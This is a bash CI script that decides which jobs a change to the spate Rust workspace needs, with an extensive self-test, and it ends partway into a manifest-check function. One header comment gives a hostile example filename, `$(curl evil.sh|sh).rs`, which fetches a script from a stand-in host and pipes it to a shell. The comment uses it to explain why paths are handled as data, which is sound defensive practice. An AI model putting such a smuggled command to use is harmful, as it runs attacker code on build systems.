#!/usr/bin/env bash
#
# Decide which CI jobs a change needs, and write the answers to
# $GITHUB_OUTPUT. Filtering is per job: a workflow skipped by `on: paths:`
# never reports its checks, and a required check that never reports blocks the
# pull request forever, where a skipped *job* reports success.
#
# Classification is an ignore-list, not an allow-list: anything not recognized
# as documentation counts as code. An allow-list fails *open*: a new source
# directory silently stops being tested, and nothing tells you.
#
# Usage:
#   scripts/ci-changes.sh              # emit outputs (reads env, see below)
#   scripts/ci-changes.sh --self-test  # verify the container map against cargo
#
# Environment:
#   EVENT_NAME    github.event_name
#   BASE_SHA      github.event.pull_request.base.sha  (pull_request only)
#   HEAD_SHA      github.event.pull_request.head.sha  (pull_request only)
#   EVENT_BEFORE  github.event.before  (push only; the `manifests` output)
#   PR_AUTHOR     github.event.pull_request.user.login  (NOT github.actor,
#                 which changes on a re-run)
#
# Filenames are attacker-controlled: a branch may legally contain a file called
# `$(curl evil.sh|sh).rs`. Every path is read into a variable and matched with
# bash patterns, never eval'd or interpolated into a command line.
#
# A `pull_request` run executes the pull request's *own* copy of this script, so
# a change here narrows the CI of the change proposing it. `.github/` and
# `scripts/` are CODEOWNERS paths.

set -euo pipefail

# Workspace packages that own `#[ignore]`d container tests. `--self-test`
# derives this same set from the source tree and fails if the two disagree.
CONTAINER_PKGS="spate spate-kafka spate-clickhouse spate-s3 spate-coordination"

# Reverse-dependency closure: given a changed crate, which container suites can
# its change possibly break? Derived from the path dependencies in each
# crates/*/Cargo.toml; `--self-test` checks it against `cargo metadata`.
#
# This answers "can it break", not "does it exercise": a change confined to
# `crates/spate-s3` still boots Kafka and ClickHouse via `-p spate`.
container_suites_for() {
    case "$1" in
        spate-core) echo "$CONTAINER_PKGS" ;;
        spate-test) echo "spate spate-kafka spate-clickhouse spate-s3" ;;
        spate-coordination) echo "spate spate-coordination spate-s3" ;;
        spate-s3) echo "spate spate-s3" ;;
        spate-kafka) echo "spate spate-kafka" ;;
        spate-clickhouse) echo "spate spate-clickhouse" ;;
        # spate-json reaches spate-s3 as a dev-dependency: the object-store
        # framing bench frames with `NdjsonFramer`, so a change to the framer
        # can break spate-s3's suite.
        spate-json) echo "spate spate-s3" ;;
        # spate-datagen reaches the facade twice: optional dependency behind
        # the `datagen` feature, and dev-dependency.
        spate-datagen) echo "spate" ;;
        spate-avro | spate) echo "spate" ;;
        # The wall-clock benchmark harness. Crates dev-depend on it for their
        # `benches/*_wall.rs` targets, and cargo builds no bench target for an
        # `#[ignore]`d test. The self-test's traversal excludes the same edge.
        spate-bench) echo "" ;;
        *) echo "" ;;
    esac
}

# Every crate that has a gungraun bench, discovered rather than listed.
#
# The cache has to be filled from the parent shell: `bench_pkgs_for` is called
# inside a command substitution, and a subshell cannot write a variable back.
# `discover_bench_pkgs` is called explicitly before any per-crate selection.
bench_pkgs_discovered=""
bench_pkgs_discovery_done=0
discover_bench_pkgs() {
    if [[ "$bench_pkgs_discovery_done" == "0" ]]; then
        bench_pkgs_discovered=$(
            "$(git rev-parse --show-toplevel)/scripts/gungraun-benches.sh" |
                cut -d' ' -f1 | sort -u
        )
        bench_pkgs_discovery_done=1
    fi
}

all_bench_pkgs() {
    discover_bench_pkgs
    # Nothing rather than a blank line when the set is empty: callers append
    # this to a space-separated list.
    [[ -z "$bench_pkgs_discovered" ]] || printf '%s\n' "$bench_pkgs_discovered"
}

# Does $1 have a gungraun bench? The name is derived from a changed path and is
# attacker-controlled, so it is compared as data: an unquoted right-hand side in
# `[[ == ]]` is a glob, and `spate-*` would match every benched crate.
has_gungraun_bench() {
    local pkg
    while IFS= read -r pkg; do
        [[ "$pkg" == "$1" ]] && return 0
    done < <(all_bench_pkgs)
    return 1
}

# Which crates' instruction-count benches should a change to $1 run? Derived
# from what the benches discover, so a crate that gains a bench is measured by
# the pull request that adds it:
#
#   spate-core             every benched crate: every crate depends on it and
#                          codegen is crate-global
#   any other benched crate  itself
#   a crate with no bench    nothing
bench_pkgs_for() {
    case "$1" in
        spate-core) all_bench_pkgs ;;
        *) if has_gungraun_bench "$1"; then echo "$1"; fi ;;
    esac
}

# ---------------------------------------------------------------------------
# The compiled-feature arms, and the matrix built from them.
# ---------------------------------------------------------------------------
# The counter tier fans out over (package, feature arm), and this is the one
# place the second dimension is written down.
#
# Each line is `<label> [<cargo feature list>]`:
#
#   label          names the arm in the report, the job name and the artifact
#                  name. `default` labels the unmodified build and is not a
#                  cargo feature name: not every package declares a `default`
#                  key, and cargo rejects `--features default` when absent.
#   feature list   what reaches `--features`, verbatim. Absent means the
#                  package's default features and no `--features` flag.
#
# An arm earns a shard by changing the code under the benches, not by being a
# feature key. `--self-test` holds the table to `cargo metadata`.
feature_arms_for() {
    case "$1" in
        # `simd` replaces the byte-slice-to-value decoder behind the backend
        # seam: one set of benches over two implementations.
        spate-json) printf '%s\n' "default" "simd simd" ;;
        *) printf '%s\n' "default" ;;
    esac
}

# The selected packages crossed with their arms, as a JSON array that
# `fromJSON` hands straight to `strategy.matrix.include`.
#
# Concatenated, not built with jq. `--self-test` holds package names to
# `[A-Za-z0-9_.-]+` and arm labels to `[A-Za-z0-9_.,-]+`, so no quote, backslash
# or control character reaches the document. A package name is a directory under
# `crates/`, which a branch chooses.
bench_shards_json() {
    local pkg label feats out="[" first=1
    for pkg in $1; do
        while read -r label feats; do
            [[ -n "$label" ]] || continue
            [[ "$first" -eq 1 ]] || out+=","
            out+="{\"package\":\"$pkg\",\"arm\":\"$label\",\"cargo_features\":\"$feats\"}"
            first=0
        done < <(feature_arms_for "$pkg")
    done
    printf '%s]\n' "$out"
}

# ---------------------------------------------------------------------------
# Self-test: assert the tables above still match the real dependency graph.
#
# Both the crate list and the container-package set are derived, never named
# here: hard-coding either side leaves the guard green while a new crate's
# container suite runs nowhere.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Label overrides.
# ---------------------------------------------------------------------------
# `ci: docker`, `ci: loom` and `ci: bench` force a suite on for a pull request
# whose changed paths would not have selected it.
#
# They can only add: `apply_ci_labels` appends and never assigns over its
# input. An override able to clear a selection would make the classifier fail
# open. Removing a label stops adding; the path-derived baseline stands.
apply_ci_labels() {
    local labels=",${1:-},"
    local suites="$2"
    if [[ "$labels" == *",ci: docker,"* ]]; then
        suites="$suites $CONTAINER_PKGS"
    fi
    echo "$suites"
}

ci_label_wants_loom() {
    local labels=",${1:-},"
    [[ "$labels" == *",ci: loom,"* ]]
}

# The instruction-count benches, also selected by path below. The label is for
# a change whose effect on the hot path the paths cannot see.
ci_label_wants_bench() {
    local labels=",${1:-},"
    [[ "$labels" == *",ci: bench,"* ]]
}

if [[ "${1:-}" == "--self-test" ]]; then
    repo_root=$(git rev-parse --show-toplevel)

    # Every case asserts that what comes out contains everything that went in.
    # `spate-kafka` stands in for "the paths already selected something".
    for labels in "" "ci: docker" "ci: loom" "ci: bench" "ci: docker,ci: loom" \
        "ci: bench,ci: docker" "crate: spate-s3,ci: docker" "area: ci"; do
        for before in "" "spate-kafka" "$CONTAINER_PKGS"; do
            after=$(apply_ci_labels "$labels" "$before")
            for pkg in $before; do
                if [[ " $after " != *" $pkg "* ]]; then
                    echo "::error::apply_ci_labels dropped '$pkg' (labels='$labels', before='$before')."
                    echo "Label overrides must only ever add suites; see the note above the function."
                    exit 1
                fi
            done
        done
    done

    # The docker label also has to do something: the guard above would pass on a
    # function that ignored its input entirely.
    if [[ " $(apply_ci_labels "ci: docker" "") " != *" spate-kafka "* ]]; then
        echo "::error::'ci: docker' no longer forces the container suites on."
        exit 1
    fi
    # Every predicate must recognize exactly its own label. The labels share a
    # prefix, so a pattern that lost a comma anchor would match a neighbour.
    if ! ci_label_wants_loom "ci: loom" ||
        ci_label_wants_loom "ci: docker" ||
        ci_label_wants_loom "ci: bench"; then
        echo "::error::ci_label_wants_loom no longer recognizes exactly the loom label."
        exit 1
    fi
    if ! ci_label_wants_bench "ci: bench" ||
        ci_label_wants_bench "ci: docker" ||
        ci_label_wants_bench "ci: loom" ||
        ci_label_wants_bench ""; then
        echo "::error::ci_label_wants_bench no longer recognizes exactly the bench label."
        exit 1
    fi

    # Additivity for a boolean output: `bench` is selected by paths OR label,
    # so the only way the label could subtract is by ceasing to match once a
    # second label arrives. Both orderings, since labels arrive in any order.
    for other in "ci: docker" "ci: loom" "crate: spate-s3" "area: ci"; do
        if ! ci_label_wants_bench "ci: bench,$other" ||
            ! ci_label_wants_bench "$other,ci: bench"; then
            echo "::error::'ci: bench' stopped matching alongside '$other'."
            exit 1
        fi
    done

    # Which crates own container tests, according to the source tree?
    derived_pkgs=""
    for dir in "$repo_root"/crates/*/; do
        if grep -rqE '#\[ignore' "$dir" --include='*.rs' 2>/dev/null; then
            derived_pkgs="$derived_pkgs $(basename "$dir")"
        fi
    done
    want=$(echo "$CONTAINER_PKGS" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
    got=$(echo "$derived_pkgs" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
    if [[ "$want" != "$got" ]]; then
        echo "::error::CONTAINER_PKGS no longer matches the crates carrying #[ignore]d tests."
        echo "  declared: $want"
        echo "  in tree:  $got"
        echo "Update CONTAINER_PKGS in scripts/ci-changes.sh."
        exit 1
    fi

    metadata=$(cargo metadata --no-deps --format-version 1)

    # The crate list comes from cargo, so a new workspace member is compared too.
    crates=$(echo "$metadata" | python3 -c \
        'import json,sys; print("\n".join(sorted(p["name"] for p in json.load(sys.stdin)["packages"])))')

    expected=$(
        while IFS= read -r crate; do
            [[ -z "$crate" ]] && continue
            sorted=$(container_suites_for "$crate" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
            printf '%s\t%s\n' "$crate" "${sorted% }"
        done <<<"$crates"
    )

    # Single-quoted so the program reaches the interpreter verbatim, with no
    # shell expansion of its `$` or backticks.
    # shellcheck disable=SC2016
    actual=$(echo "$metadata" | CONTAINER="$CONTAINER_PKGS" python3 -c '
import json, os, sys

CONTAINER = set(os.environ["CONTAINER"].split())
meta = json.load(sys.stdin)
names = {p["name"] for p in meta["packages"]}

# Forward edges, normal + dev, restricted to workspace-internal packages.
# Self-edges are the `testing`-feature dev-dependencies.
#
# Edges into the wall-clock benchmark harness are dropped for the reason stated
# beside its row in container_suites_for().
HARNESS = "spate-bench"
deps = {
    p["name"]: {d["name"] for d in p["dependencies"]
                if d["name"] in names and d["name"] != p["name"]
                and d["name"] != HARNESS}
    for p in meta["packages"]
}

def dependents(target):
    """Every package that transitively depends on target, plus target itself."""
    seen, frontier = {target}, [target]
    while frontier:
        cur = frontier.pop()
        for pkg, ds in deps.items():
            if cur in ds and pkg not in seen:
                seen.add(pkg)
                frontier.append(pkg)
    return seen

for crate in sorted(names):
    suites = " ".join(sorted(dependents(crate) & CONTAINER))
    print("{}\t{}".format(crate, suites))
')
    if [[ "$expected" != "$actual" ]]; then
        echo "::error::container_suites_for() no longer matches the crate graph."
        echo "Update the table in scripts/ci-changes.sh. Table says (<) vs cargo metadata (>):"
        diff <(echo "$expected") <(echo "$actual") || true
        exit 1
    fi
    # What is checked is the shape of the three rules, each stated in prose
    # here and in DEVELOPING.md.
    discover_bench_pkgs
    discovered=$(all_bench_pkgs)
    all_pkgs=$(all_bench_pkgs | tr '\n' ' ')
    all_pkgs="${all_pkgs% }"

    # First: an empty discovered set would satisfy most of the assertions below
    # vacuously while no pull request was measured by path at all.
    if [[ -z "$all_pkgs" ]]; then
        echo "::error::no gungraun bench was discovered; nothing would be measured by path."
        echo "Check scripts/gungraun-benches.sh and the benches/*_gungraun.rs naming convention."
        exit 1
    fi

    # spate-core reaches every count, so it selects every benched crate.
    core_pkgs=$(bench_pkgs_for spate-core | tr '\n' ' ')
    core_pkgs="${core_pkgs% }"
    if [[ "$core_pkgs" != "$all_pkgs" ]]; then
        echo "::error::bench_pkgs_for(spate-core) selects '$core_pkgs', not every benched crate."
        echo "Crates with benches: $all_pkgs"
        exit 1
    fi

    # Every other benched crate selects exactly itself.
    while IFS= read -r crate; do
        [[ -n "$crate" && "$crate" != "spate-core" ]] || continue
        selected=$(bench_pkgs_for "$crate" | tr '\n' ' ')
        if [[ "${selected% }" != "$crate" ]]; then
            echo "::error::bench_pkgs_for('$crate') selects '${selected% }', not just itself."
            exit 1
        fi
    done <<<"$discovered"

    # A crate with no bench selects nothing. Checked against the tree, and
    # against a name that is in no tree at all: the `*` arm has to answer both
    # with silence.
    #
    # spate-core is exempt: it selects every benched crate whether or not it
    # owns one, so this loop would otherwise fail a tree where its own bench had
    # been deleted.
    for dir in "$repo_root"/crates/*/; do
        crate=$(basename "$dir")
        [[ "$crate" != "spate-core" ]] || continue
        has_gungraun_bench "$crate" && continue
        if [[ -n "$(bench_pkgs_for "$crate")" ]]; then
            echo "::error::bench_pkgs_for('$crate') selects something, but '$crate' has no bench."
            exit 1
        fi
    done
    if [[ -n "$(bench_pkgs_for __no_such_crate__)" ]]; then
        echo "::error::bench_pkgs_for() selects something for a crate that does not exist."
        exit 1
    fi
    # A crate name reaches here from a changed path. Matched as data `spate-*`
    # selects nothing; matched as a pattern it would select every benched crate.
    if [[ -n "$(bench_pkgs_for 'spate-*')" ]]; then
        echo "::error::bench_pkgs_for() treats a crate name as a glob, not as data."
        exit 1
    fi

    # ------------------------------------------------------------------
    # The feature-arm table is the one hand-written thing in the selection path.
    # Each check below catches a mistake that surfaces as a burnt shard, a
    # corrupt matrix, or two report rows that cannot be told apart.
    # ------------------------------------------------------------------
    arm_failed=0

    # Every feature key cargo knows about, per package. `default` is in this
    # map only for packages that declare one.
    feature_map=$(mktemp)
    echo "$metadata" | python3 -c '
import json, sys
for p in json.load(sys.stdin)["packages"]:
    for f in sorted(p["features"]):
        print("{}\t{}".format(p["name"], f))
' >"$feature_map"

    multi_arm=0
    while IFS= read -r crate; do
        [[ -n "$crate" ]] || continue
        # The package name is concatenated into the matrix JSON and an artifact
        # name, and comes from a directory under `crates/` a branch controls.
        if [[ ! "$crate" =~ ^[A-Za-z0-9_.-]+$ ]]; then
            echo "::error::package name '$crate' carries a character that cannot go unescaped into the matrix JSON or an artifact name."
            arm_failed=1
        fi
        arms=$(feature_arms_for "$crate")
        if [[ -z "$arms" ]]; then
            echo "::error::feature_arms_for('$crate') names no arm; a benched crate needs at least the default one."
            arm_failed=1
            continue
        fi
        arm_count=0
        default_arms=0
        seen_labels=""
        while read -r label feats; do
            [[ -n "$label" ]] || continue
            arm_count=$((arm_count + 1))
            if [[ ! "$label" =~ ^[A-Za-z0-9_.,-]+$ ]]; then
                echo "::error::arm label '$label' on '$crate' carries a character that cannot go unescaped into the matrix JSON or an artifact name."
                arm_failed=1
            fi
            if [[ " $seen_labels " == *" $label "* ]]; then
                echo "::error::'$crate' declares the arm label '$label' twice; the two shards would stamp themselves identically and their rows could not be told apart."
                arm_failed=1
            fi
            seen_labels="$seen_labels $label"
            if [[ -z "$feats" ]]; then
                default_arms=$((default_arms + 1))
            else
                IFS=',' read -ra arm_feats <<<"$feats"
                for arm_feat in "${arm_feats[@]}"; do
                    if ! grep -qxF "$crate"$'\t'"$arm_feat" "$feature_map"; then
                        echo "::error::'$crate' has no feature '$arm_feat', but the arm table names it."
                        echo "Cargo would fail the shard with 'the package does not contain this feature'."
                        arm_failed=1
                    fi
                done
            fi
        done <<<"$arms"
        # Exactly one arm builds with no `--features` flag: two would be the
        # same build measured twice, none would leave the crate unmeasured.
        if [[ "$default_arms" -ne 1 ]]; then
            echo "::error::'$crate' declares $default_arms arm(s) with no feature list; exactly one (the default build) is required."
            arm_failed=1
        fi
        [[ "$arm_count" -le 1 ]] || multi_arm=1
    done <<<"$discovered"
    rm -f "$feature_map"

    # The axis has to bite somewhere. If every crate is measured under one arm,
    # the matrix has a dimension of size one everywhere and the second build is
    # not happening: a green run measuring less than it claims.
    if [[ "$multi_arm" -eq 0 ]]; then
        echo "::error::no benched crate is measured under more than one feature arm."
        echo "The (package, arm) matrix has no second arm anywhere; see feature_arms_for()."
        arm_failed=1
    fi

    # The emitted document, checked as a document: `fromJSON` in ci.yml turns a
    # malformed one into a workflow-level error with no job to attribute it to,
    # and a duplicated (package, arm) into two shards racing for one artifact.
    if ! SHARDS="$(bench_shards_json "$all_pkgs")" python3 -c '
import json, os, sys

rows = json.loads(os.environ["SHARDS"])
if not rows:
    sys.exit("the matrix is empty")
for row in rows:
    if set(row) != {"package", "arm", "cargo_features"}:
        sys.exit("unexpected keys in {!r}".format(row))
keys = [(r["package"], r["arm"]) for r in rows]
if len(set(keys)) != len(keys):
    sys.exit("duplicate (package, arm) in {!r}".format(keys))
'; then
        echo "::error::the emitted bench matrix is not the shape ci.yml's strategy.matrix.include reads."
        arm_failed=1
    fi
    [[ "$arm_failed" == "0" ]] || exit 1

    # What each path arm selects. The checks above test the selection
    # functions; the arms are what consult them.
    path_case_failed=0
    # Classify a synthetic path list, leaving the child's outputs in $1.
    #
    # A subprocess, because classification runs at the bottom of this file. The
    # answers come from the child's own `GITHUB_OUTPUT`, not its stdout: the
    # classifier `tee`s to both, so stdout carries every line twice when the
    # variable is unset. `PR_LABELS` and `EVENT_NAME` are unset so neither a
    # label nor an event can decide what the arms should.
    classify_into() { # dest, paths...
        local dest=$1 list
        shift
        list=$(mktemp)
        printf '%s\0' "$@" >"$list"
        env -u PR_LABELS -u EVENT_NAME GITHUB_OUTPUT="$dest" \
            "$0" --classify-paths "$list" >/dev/null
        rm -f "$list"
    }

    check_paths() {
        local want_bench="$1" want_pkgs="$2" desc="$3"
        shift 3
        local out got_bench got_pkgs
        want_pkgs=$(bench_shards_json "$want_pkgs")
        out=$(mktemp)
        classify_into "$out" "$@"
        got_bench=$(sed -n 's/^bench=//p' "$out")
        got_pkgs=$(sed -n 's/^bench-shards=//p' "$out")
        rm -f "$out"
        if [[ "$got_bench" != "$want_bench" || "$got_pkgs" != "$want_pkgs" ]]; then
            echo "::error::$desc: expected bench=$want_bench bench-shards='$want_pkgs',"
            echo "got bench=$got_bench bench-shards='$got_pkgs' for: $*"
            path_case_failed=1
        fi
    }

    # The sample crates are derived, not named: naming one would put this file
    # back in the path of every pull request that adds or removes a bench.
    benched_a="" benched_b="" unbenched=""
    while IFS= read -r crate; do
        [[ -n "$crate" && "$crate" != "spate-core" ]] || continue
        if [[ -z "$benched_a" ]]; then
            benched_a="$crate"
        elif [[ -z "$benched_b" ]]; then
            benched_b="$crate"
        fi
    done <<<"$discovered"
    for dir in "$repo_root"/crates/*/; do
        crate=$(basename "$dir")
        # Exempt for the same reason as the loop above.
        [[ "$crate" != "spate-core" ]] || continue
        has_gungraun_bench "$crate" && continue
        unbenched="$crate"
        break
    done

    check_paths true "$all_pkgs" "the core crate selects every benched crate" \
        crates/spate-core/src/lib.rs
    if [[ -n "$benched_a" ]]; then
        check_paths true "$benched_a" "a benched crate selects itself" \
            "crates/$benched_a/src/lib.rs"
    fi
    if [[ -n "$benched_b" ]]; then
        # Discovery is sorted and so is the emitted list.
        check_paths true "$benched_a $benched_b" "two benched crates select both" \
            "crates/$benched_a/src/lib.rs" "crates/$benched_b/src/lib.rs"
    fi
    if [[ -n "$unbenched" ]]; then
        check_paths false "" "a crate without a bench selects nothing" \
            "crates/$unbenched/src/lib.rs"
    fi
    check_paths false "" "docs select nothing" docs/METRICS.md
    # Every file that can change what the counter tier measures, in the same
    # order as the `case` arm it mirrors. A file added to one and not the other
    # silently stops forcing a full re-measurement.
    for apparatus in scripts/ci-changes.sh scripts/gungraun-benches.sh \
        scripts/gungraun-report.sh scripts/gungraun-collected-region.sh \
        .github/workflows/ci.yml .github/actions/setup-rust/action.yml; do
        check_paths true "$all_pkgs" "$apparatus selects every benched crate" \
            "$apparatus"
    done

    # The two coarse outputs, asserted together because one arm decides both
    # and the regression worth catching turns off exactly one.
    #
    # `site` is the transclusion rule: a page's Rust snippets are regions of a
    # file under `crates/`. `rust` is asserted nowhere else, and an arm that
    # sets `site` and then `continue`s would turn off clippy and the test suite
    # for an examples-only pull request.
    check_flags() { # want_rust, want_site, desc, paths...
        local want_rust="$1" want_site="$2" desc="$3"
        shift 3
        local out got_rust got_site
        out=$(mktemp)
        classify_into "$out" "$@"
        got_rust=$(sed -n 's/^rust=//p' "$out")
        got_site=$(sed -n 's/^site=//p' "$out")
        rm -f "$out"
        if [[ "$got_rust" != "$want_rust" || "$got_site" != "$want_site" ]]; then
            echo "::error::$desc: expected rust=$want_rust site=$want_site,"
            echo "got rust=$got_rust site=$got_site for: $*"
            path_case_failed=1
        fi
    }

    # Derived, not named: `classify_into` never stats a file, so a literal would
    # keep passing after the example it names is renamed away. Hence the
    # empty-set guard.
    example_path="$(find crates/spate/examples -maxdepth 1 -name '*.rs' | sort | head -1)"
    if [[ -z "$example_path" ]]; then
        echo "::error::no example under crates/spate/examples; the case below asserts nothing."
        path_case_failed=1
    else
        check_flags true true "an example builds Rust and rebuilds the site" \
            "$example_path"
    fi
    check_flags true true "a crate source builds Rust and rebuilds the site" \
        crates/spate-core/src/lib.rs
    check_flags false true "a docs page rebuilds the site and needs no Rust build" \
        docs/METRICS.md
    check_flags false true "the site tree rebuilds the site and needs no Rust build" \
        website/docusaurus.config.ts
    check_flags true false "a bench source builds Rust and does not rebuild the site" \
        bench/src/lib.rs

    # The manifest gate's selection, asserted the same way. Source changes do
    # not select it: the nightly backstop covers packaging breaks a manifest
    # list cannot see, and selecting on source would run it on every merge.
    check_manifests() { # want, desc, paths...
        local want="$1" desc="$2"
        shift 2
        local out got
        out=$(mktemp)
        classify_into "$out" "$@"
        got=$(sed -n 's/^manifests=//p' "$out")
        rm -f "$out"
        if [[ "$got" != "$want" ]]; then
            echo "::error::$desc: expected manifests=$want, got manifests=$got for: $*"
            path_case_failed=1
        fi
    }
    check_manifests true "the lockfile reaches packaging" Cargo.lock
    check_manifests true "the workspace manifest reaches packaging" Cargo.toml
    check_manifests true "a crate manifest reaches packaging" crates/spate-core/Cargo.toml
    check_manifests true "a packaged README reaches packaging" crates/spate/README.md
    check_manifests true "the bump tool is the gate's own apparatus" scripts/release-version.sh
    check_manifests false "a crate source does not select the gate" crates/spate-core/src/lib.rs
    check_manifests false "a docs page does not select the gate" docs/METRICS.md

    [[ "$path_case_failed" == "0" ]] || exit 1

    echo "container_suites_for() matches the crate graph, CONTAINER_PKGS matches the tree,"
    echo "the label overrides are additive, bench selection follows what the benches"
    echo "discover, every feature arm names a feature its package declares, and each"
    echo "path arm selects the crates it claims to."
    exit 0
fi

# ---------------------------------------------------------------------------
# Collect the changed paths.
# ---------------------------------------------------------------------------
force_all=0
changed_file=$(mktemp)
trap 'rm -f "$changed_file"' EXIT

# `--classify-paths FILE` classifies a NUL-separated list given on the command
# line instead of a diff, so `--self-test` can assert what each arm below
# selects. An argument rather than an environment variable: an exported variable
# could turn a real classification into a synthetic one. The sentinel is
# hyphenated so no webhook event name can collide with it.
mode="${EVENT_NAME:-}"
if [[ "${1:-}" == "--classify-paths" ]]; then
    if [[ -z "${2:-}" || ! -r "${2:-}" ]]; then
        echo "--classify-paths needs a readable file of NUL-separated paths" >&2
        exit 2
    fi
    cat "$2" >"$changed_file"
    mode=classify-paths
fi

case "$mode" in
classify-paths)
    # The list is already in place; skip the diff entirely.
    ;;
pull_request)
    # Against the *merge base*, not the base branch tip: `base.sha` is the tip,
    # so a two-dot diff also reports everything main gained since this branch
    # last moved.
    #
    # `--no-renames` because rename detection prints only the destination path:
    # `git mv crates/spate-s3/src/foo.rs docs/foo.rs` would look like a
    # docs-only change while deleting compiled source: a fail-*open*.
    #
    # `-z` because `core.quotePath` defaults to true, so a non-ASCII path is
    # C-quoted (`"docs/caf\303\251.mdx"`) and matches no pattern below. NUL
    # output cannot survive a command substitution, hence the temporary file.
    if ! merge_base=$(git merge-base "${BASE_SHA:-}" "${HEAD_SHA:-}" 2>/dev/null) ||
        [[ -z "$merge_base" ]]; then
        echo "note: no merge base for ${BASE_SHA:-?}..${HEAD_SHA:-?}; running everything."
        force_all=1
    elif ! git diff --no-ext-diff --no-textconv --name-only -z --no-renames \
        "$merge_base" "${HEAD_SHA}" >"$changed_file" 2>/dev/null; then
        echo "note: could not diff ${merge_base}..${HEAD_SHA}; running everything."
        force_all=1
    fi
    ;;
*)
    # push, merge_group, schedule, workflow_dispatch: no pull-request diff to
    # reason about, and a push to main is the last line of defence.
    force_all=1
    ;;
esac

# ---------------------------------------------------------------------------
# Classify.
# ---------------------------------------------------------------------------
rust=false
site=false
bench=false
bench_pkgs=""
suites=""

if [[ "$force_all" == "1" ]]; then
    rust=true
    site=true
    bench=true
    bench_pkgs=$(all_bench_pkgs)
    suites="$CONTAINER_PKGS"
else
    # Fill the discovery cache in the parent shell; see discover_bench_pkgs.
    discover_bench_pkgs
    while IFS= read -r -d '' file; do
        [[ -z "$file" ]] && continue

        # First match wins, and the order matters. In a bash `case` pattern `*`
        # matches `/` as well, so a bare `*.md` arm would also swallow
        # crates/spate/README.md, and a crate README can be compiled into the
        # library with `#![doc = include_str!(...)]`.
        case "$file" in
        # Source trees: always code, whatever the file extension. Empty body,
        # so control falls past the `case` to the classification below.
        #
        # `crates/*` is split out because it selects the site as well: a docs
        # page's Rust snippets are regions of a file under `crates/`, so an edit
        # there can change a rendered page without touching `docs/`. The whole
        # tree, because a `file=` attribute may point anywhere under it and a
        # narrower list goes stale by failing OPEN.
        crates/*)
            site=true
            ;;
        scripts/* | bench/*) ;;
        # CI definitions decide what every other job does.
        .github/workflows/* | .github/actions/*) ;;
        # The rest of `.github/` cannot reach a Rust build or the site.
        .github/*)
            continue
            ;;
        # --- documentation and site sources: no Rust build needed ------------
        docs/* | website/*)
            site=true
            continue
            ;;
        # Root-level prose and repo furniture.
        *.md | LICENSE | .gitignore | .dockerignore)
            continue
            ;;
        esac

        # --- everything else is code ----------------------------------------
        rust=true

        # Which container suites can this file reach?
        case "$file" in
        crates/*)
            crate="${file#crates/}"
            crate="${crate%%/*}"
            suites="$suites $(container_suites_for "$crate")"
            ;;
        # A dependency or lint change moves the whole graph. So does a change to
        # the workflows, the composite action, the Makefile the workflow steps
        # call, or this script: the last one decides what runs at all.
        Cargo.lock | Cargo.toml | deny.toml | rust-toolchain.toml | .config/* | \
            .github/workflows/* | .github/actions/* | scripts/* | Makefile)
            suites="$suites $CONTAINER_PKGS"
            site=true
            ;;
        esac

        # Which files can move an instruction count, and whose benches should
        # run? The unit is the whole crate, because codegen is crate-global.
        # A separate `case` from the one above: the two questions have different
        # answers for the same file.
        case "$file" in
        crates/*)
            crate="${file#crates/}"
            crate="${crate%%/*}"
            selected=$(bench_pkgs_for "$crate")
            if [[ -n "$selected" ]]; then
                bench=true
                bench_pkgs="$bench_pkgs $selected"
            fi
            ;;
        # The measuring apparatus itself: a change to what gets discovered,
        # which crates are chosen, or how the results are read can alter the
        # outcome for every crate. Without this file on the list, the pull
        # request that rewrites how benches are chosen is the one that never
        # runs them, and the bench job has reported `skipped` that way.
        #
        # `.github/actions/` because the shared build cache is configured there,
        # and which cache a shard restores decides whether it compiles the bench
        # graph from scratch.
        scripts/ci-changes.sh | scripts/gungraun-benches.sh | \
            scripts/gungraun-report.sh | scripts/gungraun-collected-region.sh | \
            .github/workflows/ci.yml | .github/actions/*)
            bench=true
            bench_pkgs="$bench_pkgs $(all_bench_pkgs)"
            ;;
        esac
    done <"$changed_file"
fi

# A dependency bump touches Cargo.lock, which by the rule above reaches every
# container suite: one boot of SeaweedFS, NATS, Kafka and ClickHouse per bump
# and per rebase. These pull requests keep the cheap tier and give up only the
# container suites, which the push-to-main run re-runs in full.
if [[ "${PR_AUTHOR:-}" == "dependabot[bot]" && "${EVENT_NAME:-}" == "pull_request" ]]; then
    echo "note: dependabot pull request; container suites deferred to push-to-main."
    suites=""
fi

# The release pull request release-plz keeps open is the same trade: its whole
# diff is `Cargo.toml` and `Cargo.lock`, rewritten on every push to `main`.
#
# Its source tree is byte-identical to the `main` commit that just ran the
# container suites on push.
if [[ "${PR_AUTHOR:-}" == "spate-release[bot]" && "${EVENT_NAME:-}" == "pull_request" ]]; then
    echo "note: release pull request; container suites deferred to push-to-main."
    suites=""
fi

# Applied after the deferrals above, so labelling a Dependabot or release pull
# request `ci: docker` overrides one for that one bump.
before_labels="$suites"
suites=$(apply_ci_labels "${PR_LABELS:-}" "$suites")
if [[ "$suites" != "$before_labels" ]]; then
    echo "note: 'ci: docker' label present; container suites forced on."
fi

loom=false
if ci_label_wants_loom "${PR_LABELS:-}"; then
    echo "note: 'ci: loom' label present; loom models forced on."
    loom=true
fi

if ci_label_wants_bench "${PR_LABELS:-}"; then
    echo "note: 'ci: bench' label present; instruction counts forced on."
    bench=true
    bench_pkgs=$(all_bench_pkgs)
fi

# Deduplicate: a change touching several files in one measured crate would
# otherwise run its benches once per file.
bench_pkgs_out=""
if [[ -n "${bench_pkgs// /}" ]]; then
    bench_pkgs_out=$(echo "$bench_pkgs" | tr ' ' '\n' | grep -v '^$' | sort -u | tr '\n' ' ')
    bench_pkgs_out="${bench_pkgs_out% }"
fi

# Cross the selection with the arm table. An empty `include:` is a workflow
# *error* rather than a skipped job, so the boolean and the array have to
# agree.
bench_shards=$(bench_shards_json "$bench_pkgs_out")
if [[ "$bench_shards" == "[]" ]]; then
    bench=false
fi

# Deduplicate and render as cargo -p arguments.
container_args=""
if [[ -n "${suites// /}" ]]; then
    for pkg in $(echo "$suites" | tr ' ' '\n' | grep -v '^$' | sort -u); do
        container_args="$container_args -p $pkg"
    done
    container_args="${container_args# }"
fi

# ---------------------------------------------------------------------------
# Manifest reach, for the publish dry-run gate.
# ---------------------------------------------------------------------------
# The set of files that change what `cargo package` produces or what the
# release rewrites: the manifests and lockfile, the READMEs cargo packages
# into the crates, and the bump tool the gate itself runs.
path_is_manifest() {
    case "$1" in
